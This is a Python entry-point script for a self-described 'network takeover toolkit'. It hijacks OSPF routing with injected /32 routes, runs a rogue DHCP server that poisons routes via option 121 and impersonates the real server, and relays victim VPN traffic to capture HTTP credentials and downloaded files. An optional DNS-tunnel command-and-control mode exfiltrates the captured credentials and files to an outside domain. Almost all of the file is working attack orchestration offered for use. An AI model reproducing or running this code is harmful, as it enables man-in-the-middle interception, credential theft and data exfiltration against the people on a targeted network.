#!/usr/bin/env python3
# v3.0
"""
main.py — network takeover toolkit entry point.

Orchestrates four modules in /final:

    dhcp_takeover   DHCP discovery, identity theft, and the rogue DHCP server
                    (OFFER/ACK/NAK/RELEASE, opt121, DNS).
    ospf_adjacency  OSPFv2 passive Hello sniffing to learn SVI parameters, then
                    full-adjacency engine that injects a /32 host route for our
                    stolen DHCP-server IP.  Launched in its own terminal.
    vpn_relay       Detect/start the host VPN, then selectively relay victim traffic
                    bound for VPN subnets through the tunnel while everything else
                    passes straight to the real default gateway.
    http_intercept  Capture HTTP credentials and downloaded objects from the
                    plaintext traffic we now carry.
    dns_c2          DNS tunnel C2 client (loaded only when --remote is passed).

Usage:
    sudo python3 main.py [--remote] [--domain DOMAIN] [--dns-server IP]
                         [--target IP] [--ospf-timeout SECS]

Options:
    --remote / -r           Activate DNS tunnel C2 mode.
    --domain DOMAIN         DNS zone for the C2 channel  (default: d.lootforge.org)
    --dns-server IP         Resolver for C2 traffic (default: system resolver)
    --target IP             /32 host route to inject via OSPF (default: stolen
                            DHCP server IP learned during offer sniffing)
    --ospf-timeout SECS     Seconds to wait for an OSPF Hello (default: 30)

Before running, set DEFAULT_INTERFACE in dhcp_takeover.py to the interface facing
the target network (default: "eth0").  Root is required for raw sockets, iptables,
and interface/route changes.  Linux (Kali) only.

End-to-end flow:
    1.  Passively sniff OSPF Hellos on 224.0.0.5 to learn the SVI's area ID,
        timers, netmask, and interface IP (= subnet gateway).
    2.  DHCPDISCOVER on the learned subnet; capture DHCPOFFER.
    3.  Steal the offered client IP (static), form a full OSPF adjacency matching
        the SVI's parameters, inject a /32 host route for the target IP, and add
        the real DHCP server's IP to our loopback (identity theft).
        IP forwarding and iptables MASQUERADE rules are set up for transparent relay.
    4.  Detect the host VPN (start OpenVPN if needed); derive the target /24.
    5.  Inject option 121: <tun /24> via our identity + 0.0.0.0/0 via real router.
    6.  Sniff the carried plaintext for credentials and downloaded files.
    7.  Serve DHCP as the rogue server until interrupted.
    8.  On exit: MaxAge-flood our Router-LSA (withdraws injected /32), remove
        iptables rules, restore ip_forward.
"""

import argparse
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import ospf_adjacency
import vpn_relay
import http_intercept

from dhcp_takeover import (
    print_step,
    DEFAULT_INTERFACE,
    IMPERSONATE_REAL_SERVER,
    pick_client_ip,
    send_dhcpdiscover,
    sniff_dhcpoffer,
    set_static_address,
    get_interface_ipv4_addresses,
    wait_for_interface_ipv4_address,
    add_loopback_ipv4_address,
    remove_loopback_ipv4_address,
    build_server_details_from_ospf,
    sniff_for_dhcp_discover_and_request,
)


# ── CLI argument parsing ───────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="main.py",
        description="Network takeover toolkit (OSPF MITM + DHCP + VPN relay + HTTP capture)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--remote", "-r",
        action="store_true",
        help="Activate DNS tunnel C2 mode (handshake + command polling + file exfil)",
    )
    parser.add_argument(
        "--domain",
        default="d.lootforge.org",
        metavar="DOMAIN",
        help="DNS zone for the C2 channel",
    )
    parser.add_argument(
        "--dns-server",
        default=None,
        metavar="IP",
        dest="dns_server",
        help="Resolver for C2 traffic (default: auto-detected system resolver)",
    )
    parser.add_argument(
        "--target",
        default=None,
        metavar="IP",
        help="Host IP for the injected /32 OSPF route (default: stolen DHCP server IP)",
    )
    parser.add_argument(
        "--ospf-timeout",
        default=30,
        type=int,
        metavar="SECS",
        dest="ospf_timeout",
        help="Seconds to wait passively for an OSPF Hello before aborting",
    )
    parser.add_argument(
        "--dns",
        default=None,
        metavar="IP",
        help="DNS server to advertise in DHCP leases (default: learned from DHCPOFFER)",
    )
    return parser.parse_args()


# ── C2 initialisation ─────────────────────────────────────────────────────────

def _init_c2(args) -> dict | None:
    """
    Perform handshake with the DNS C2 server.

    Returns a c2_config dict on success, or None if the handshake fails or
    --remote was not passed.  The dict is threaded through to the debug menu.
    """
    if not args.remote:
        return None

    import dns_c2 as _c2

    dns_server = args.dns_server or _c2.get_system_dns()
    agent_id = _c2.gen_agent_id()

    print_step("START", f"C2 mode — domain={args.domain}  resolver={dns_server}  agent={agent_id}")
    if not _c2.perform_handshake(agent_id, args.domain, dns_server):
        print_step("WARN", "C2 handshake failed — continuing without remote mode")
        return None

    _c2.start_command_poll(args.domain, dns_server)
    print_step("OK", f"C2 ready — command poll every {_c2.COMMAND_POLL_INTERVAL}s")
    return {"domain": args.domain, "dns_server": dns_server, "agent_id": agent_id}


# ── Debug menu ────────────────────────────────────────────────────────────────

def _show_ospf_networks(ospf_hellos: list) -> None:
    import ipaddress as _ip
    _auth = {0: "none", 1: "simple-pw", 2: "MD5"}
    if not ospf_hellos:
        print("  (no OSPF Hellos captured)")
        return
    for p in ospf_hellos:
        try:
            subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
        except Exception:
            subnet = f"{p['src_ip']}/{p['netmask']}"
        print(f"  Router ID : {p['router_id']}")
        print(f"  Gateway   : {p['src_ip']}")
        print(f"  Subnet    : {subnet}")
        print(f"  Area      : {p['area_id']}")
        print(f"  Timers    : hello={p['hello_interval']}s  dead={p['dead_interval']}s")
        print(f"  Options   : 0x{p['options']:02x}  (area={'normal' if p['options'] & 0x02 else 'stub'})")
        print(f"  Auth      : {_auth.get(p['auth_type'], p['auth_type'])}")
        print(f"  DR / BDR  : {p['dr']} / {p['bdr']}")
        print()


def _show_leases(networks: list) -> None:
    total = 0
    for net in networks:
        for ip in sorted(net["leased_addresses"]):
            vlan = net.get("vlan_id") or "—"
            print(f"  {ip:17s}  net={net['network']}  vlan={vlan}")
            total += 1
    if total == 0:
        print("  (no confirmed leases yet)")
    else:
        print(f"\n  Total: {total} confirmed lease(s)")


def _show_intercepted() -> None:
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG

    tun = vpn_relay._fwd_tun_iface
    phys = vpn_relay._fwd_phys_iface
    if tun:
        print(f"  VPN relay active: {phys} → {tun}")
        print(f"  HTTP intercept running on: {tun}")
    else:
        print("  VPN relay: inactive (passthrough mode)")
    print()

    files = []
    if os.path.isdir(intercept_dir):
        for fname in sorted(os.listdir(intercept_dir)):
            fpath = os.path.join(intercept_dir, fname)
            try:
                size = os.path.getsize(fpath)
            except OSError:
                size = 0
            files.append((fname, fpath, size))

    if files:
        print(f"  Intercepted HTTP objects ({intercept_dir}):")
        for fname, _, size in files:
            print(f"    {fname:<45s} {size:>9d} B")
        total_bytes = sum(s for _, _, s in files)
        print(f"\n  {len(files)} file(s) — {total_bytes:,} B total")
    else:
        print(f"  No intercepted objects yet  ({intercept_dir})")

    print()
    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Credential log ({cred_log}):")
        try:
            with open(cred_log) as f:
                for line in f:
                    print(f"    {line.rstrip()}")
        except OSError as exc:
            print(f"  (could not read cred log: {exc})")
    else:
        print(f"  No credentials captured yet  ({cred_log})")


def _transmit_to_c2(c2_config: dict) -> None:
    import dns_c2 as _c2

    domain = c2_config["domain"]
    dns_server = c2_config["dns_server"]
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG
    sent = 0

    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Sending credential log → C2...")
        if _c2.exfiltrate_file(cred_log, domain, dns_server):
            sent += 1

    n = _c2.exfiltrate_dir(intercept_dir, domain, dns_server)
    sent += n

    if sent == 0:
        print("  Nothing to transmit — no credentials or intercepted files yet.")
    else:
        print(f"  Transmitted {sent} file(s) to C2.")


def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
               c2_config: dict | None = None, ospf_hellos: list | None = None) -> None:
    """
    Interactive debug console.  Runs in a daemon thread while the DHCP sniff
    loop blocks the main thread.

    Always available options:
      1  OSPF-discovered SVIs / subnets
      2  Active leases issued by the rogue server
      3  Intercepted VPN traffic (files) and captured credentials

    Remote-only option (requires --remote and a successful C2 handshake):
      4  Transmit intercepted files and credentials to C2 over DNS tunnel
    """
    time.sleep(2)  # let startup output settle
    while True:
        sep = "─" * 52
        print(f"\n{sep}")
        print("  Debug Console")
        print(sep)
        print("  1)  OSPF-discovered SVIs / subnets")
        print("  2)  Active leases")
        print("  3)  Intercepted traffic / credentials")
        if c2_config:
            print(f"  4)  Transmit to C2  (agent={c2_config['agent_id']})")
        print("  q)  Close menu (server keeps running)")
        print(sep)

        try:
            choice = input("debug> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == "1":
            _show_ospf_networks(ospf_hellos or [])
        elif choice == "2":
            _show_leases(networks)
        elif choice == "3":
            _show_intercepted()
        elif choice == "4" and c2_config:
            _transmit_to_c2(c2_config)
        elif choice == "q":
            print("  Debug menu closed.")
            break
        else:
            print(f"  Unknown option: {choice!r}")


# ── Network setup + OSPF adjacency ───────────────────────────────────────────

def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
    """Configure our IP, discover the real DHCP server, form OSPF adjacency.

    Steps:
      1. Reuse existing IP on the interface if it's already in the OSPF subnet,
         otherwise pick one and configure it.
      2. Start the DHCPOFFER sniffer BEFORE sending the discover (avoids the
         race where the offer arrives before the sniffer is ready).
      3. Add a default route via the SVI so forwarded packets reach the internet.
      4. Add a loopback alias for the real DHCP server IP so the kernel accepts
         relayed packets addressed to it (cross-VLAN DHCP relay).
      5. Launch the OSPF adjacency engine and wait for LS exchange.

    Returns (interface, our_ip, offer, dhcp_server_ip).
    dhcp_server_ip is the loopback-aliased real server IP, or None.
    """
    import ipaddress as _ip
    netmask = ospf_params["netmask"]
    subnet = _ip.IPv4Network(f"{ospf_params['src_ip']}/{netmask}", strict=False)
    svi_ip = ospf_params["src_ip"]

    # ── Step 1: pick / reuse interface IP ────────────────────────────────────
    our_ip = None
    for addr_prefix in get_interface_ipv4_addresses(interface):
        addr = addr_prefix.split("/")[0]
        try:
            candidate = _ip.IPv4Address(addr)
            if candidate in subnet and str(candidate) != svi_ip:
                our_ip = addr
                print_step("OK", f"Reusing existing IP {our_ip} on {interface} (in OSPF subnet {subnet})")
                break
        except ValueError:
            continue

    if our_ip is None:
        our_ip = pick_client_ip(ospf_params)
        print_step("START", f"Configuring {our_ip}/{netmask} on {interface}")
        set_static_address(interface, our_ip, netmask)
        wait_for_interface_ipv4_address(interface, expected_address=our_ip)

    # ── Step 2: concurrent DHCPDISCOVER + sniffer ─────────────────────────────
    # Start the sniffer first, then send — avoids the race where the offer
    # arrives in the window before sniff() installs its BPF filter.
    offer_result = [None]

    def _sniff():
        offer_result[0] = sniff_dhcpoffer(interface, timeout=10)

    sniff_thread = threading.Thread(target=_sniff, daemon=True)
    sniff_thread.start()
    time.sleep(0.3)  # let BPF filter install before sending
    send_dhcpdiscover(interface)
    sniff_thread.join()
    offer = offer_result[0]

    # ── Step 3: default route via SVI ─────────────────────────────────────────
    ospf_adjacency.add_default_route(svi_ip, interface)

    # ── Step 4: loopback alias for real DHCP server IP ───────────────────────
    # Without this, relayed DHCP unicast (dst = real server IP) triggers ICMP
    # unreachable from our kernel, aborting the relay on the router.
    dhcp_server_ip = target_ip or (offer.get("server_id") if offer else None)
    if dhcp_server_ip and dhcp_server_ip != our_ip:
        try:
            add_loopback_ipv4_address(dhcp_server_ip)
        except Exception as exc:
            print_step("WARN", f"Could not add loopback alias for {dhcp_server_ip}: {exc}")
            dhcp_server_ip = None

    route_ip = dhcp_server_ip or our_ip
    print_step("OK", f"OSPF /32 injection target: {route_ip}")

    # ── Step 5: OSPF adjacency ────────────────────────────────────────────────
    ospf_adjacency.launch_in_terminal(
        interface,
        auto_route_ip=route_ip,
        area_id=ospf_params["area_id"],
        hello_interval=ospf_params["hello_interval"],
        dead_interval=ospf_params["dead_interval"],
    )
    ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
    return interface, our_ip, offer, dhcp_server_ip


def start_http_intercept(sniff_iface):
    """Launch the HTTP credential/object interceptor in a daemon thread."""
    print_step("START", f"Starting HTTP interceptor on {sniff_iface}")
    print_step("OK", f"Credential log: {os.path.abspath(http_intercept.CRED_LOG)}")
    print_step("OK", f"HTTP objects  : {http_intercept.INTERCEPT_DIR}")
    thread = threading.Thread(
        target=http_intercept.sniff_loop,
        kwargs={"iface": sniff_iface},
        daemon=True,
    )
    thread.start()
    return thread


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    print("Network Takeover Toolkit v3.0 — Starting...")
    args = _parse_args()
    interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py

    # ── C2 handshake (before any network activity so operator confirms aliveness)
    c2_config = _init_c2(args)

    # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
    print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout={args.ospf_timeout}s)")
    ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=args.ospf_timeout)
    if not ospf_hellos:
        print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
        return
    ospf_params = ospf_hellos[0]  # use first SVI for adjacency

    # Enable IP forwarding early; save old value for teardown.
    saved_ip_forward = ospf_adjacency.enable_ip_forwarding()

    ospf_iface_for_fwd = None
    loopback_alias_ip = None
    try:
        # ── Phase 2+3: configure IP, untagged discover, OSPF adjacency ───────
        ospf_interface, our_ip, offer, loopback_alias_ip = setup_and_form_adjacency(
            interface, ospf_params, target_ip=args.target
        )
        ospf_iface_for_fwd = ospf_interface

        # iptables FORWARD + MASQUERADE for transparent relay.
        ospf_adjacency.setup_forwarding(ospf_interface, interface)

        # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
        networks = []
        proposed_leases = {}
        server_details = build_server_details_from_ospf(
            ospf_interface, ospf_params, our_ip, offer=offer, dns=getattr(args, "dns", None)
        )

        tun_iface = vpn_relay.enable_vpn_relay(server_details, ospf_interface)

        # ── Phase 6: HTTP interception on the traffic we now carry ───────────
        # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
        # interface when there is no VPN relay.
        start_http_intercept(tun_iface or ospf_interface)

        # ── Debug console — runs in background while Phase 7 blocks ──────────
        debug_thread = threading.Thread(
            target=debug_menu,
            args=(networks, proposed_leases, server_details, c2_config, ospf_hellos),
            daemon=True,
            name="debug-menu",
        )
        debug_thread.start()

        # ── Phase 7: rogue DHCP server (blocking) ────────────────────────────
        relay_mode = (
            f"VPN relay via {tun_iface} → {server_details.get('opt121_subnets')}"
            if tun_iface else "passthrough only"
        )
        print_step(
            "START",
            f"Rogue DHCP server starting — {relay_mode} | "
            f"impersonate={'ON' if IMPERSONATE_REAL_SERVER else 'OFF'}",
        )
        handled_events = sniff_for_dhcp_discover_and_request(
            networks,
            proposed_leases,
            server_details,
        )
        print_step("OK", f"DHCP server finished: {len(handled_events)} event(s) handled")
        return handled_events
    finally:
        # ── Phase 8: teardown ─────────────────────────────────────────────────
        # LSA withdrawal (MaxAge-flood our Router-LSA) is handled automatically
        # by the adjacency engine subprocess on its own KeyboardInterrupt.
        # Here we clean up the iptables rules and restore ip_forward.
        print_step("START", "Teardown: removing forwarding rules and restoring system state")
        if ospf_iface_for_fwd:
            ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
            ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
        if loopback_alias_ip:
            remove_loopback_ipv4_address(loopback_alias_ip)
        ospf_adjacency.restore_ip_forwarding(saved_ip_forward)


if __name__ == "__main__":
    main()
